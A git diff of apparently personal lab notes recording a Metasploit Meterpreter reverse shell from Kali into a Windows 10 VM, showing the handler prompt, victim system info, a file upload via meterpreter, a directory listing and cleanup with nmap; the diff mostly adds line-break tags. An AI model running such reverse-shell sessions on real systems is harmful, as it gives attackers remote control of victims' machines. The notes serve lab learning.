@@ -49,44 +49,44 @@ msf6 exploit(multi/handler) > exploit
 
 # you have now spawned reverse shell with meterpreter # 
 
-meterpreter > sysinfo
+meterpreter > sysinfo <br>
  
 Computer        : DESKTOP-WINDERS10 <br>
-OS              : Windows 10 (10.0 Build 19044).
-Architecture    : x64
-System Language : en_US
-Domain          : WORKGROUP
+OS              : Windows 10 (10.0 Build 19044). <br>
+Architecture    : x64 <br>
+System Language : en_US <br>
+Domain          : WORKGROUP <br>
 Logged On Users : 2
-Meterpreter     : x86/windows
+Meterpreter     : x86/windows<br>
 
-# open another terminal create a readme.txt to upload to windows computer in meterpreter #
-
+# open another terminal create a readme.txt to upload to windows computer in meterpreter #<br>
+<br>
 ┌──(root💀kali)-[/g]
 └─# nano readme.txt  <-- paste in the msfbanner that launched at the beginning, (I used a cow and ninja)
-
+<br>
 # Go back to meterpreter #
+<br>
+> meterpreter > upload readme.txt<br>
+[*] uploading  : /g/readme.txt -> readme.txt<br>
+[*] Uploaded 1.39 KiB of 1.39 KiB (100.0%): /g/readme.txt -> readme.txt<br>
+[*] uploaded   : /g/readme.txt -> readme.txt<br>
+meterpreter > ls<br>
+> Listing: C:\Users\Gregster\Downloads<br>
 
-> meterpreter > upload readme.txt
-[*] uploading  : /g/readme.txt -> readme.txt
-[*] Uploaded 1.39 KiB of 1.39 KiB (100.0%): /g/readme.txt -> readme.txt
-[*] uploaded   : /g/readme.txt -> readme.txt
-meterpreter > ls
-> Listing: C:\Users\Gregster\Downloads
-
-## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 call it a night tbc... #
-
+## vefify that the file is there list and then look at it in windows machine, change directories in meterpreter, stop apache2 call it a night tbc... #<br>
+<br>
 ┌──(root💀kali)-[/g]
 └─# systemctl stop apache2  
-
+<br>
 ┌──(root💀kali)-[/g]
 └─# nmap -p80 localhost          
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:40 EST
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000086s latency).
-Other addresses for localhost (not scanned): ::1
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:40 EST<br>
+Nmap scan report for localhost (127.0.0.1)<br>
+Host is up (0.000086s latency).<br>
+Other addresses for localhost (not scanned): ::1<br>
 
-PORT   STATE  SERVICE
-80/tcp closed http
+PORT   STATE  SERVICE<br>
+80/tcp closed http<br>
 
-# meterpreter
-Metasploit/Meterpreter reverse shell from Kali to Windows VM
+# meterpreter<br>
+Metasploit/Meterpreter reverse shell from Kali to Windows VM<br>
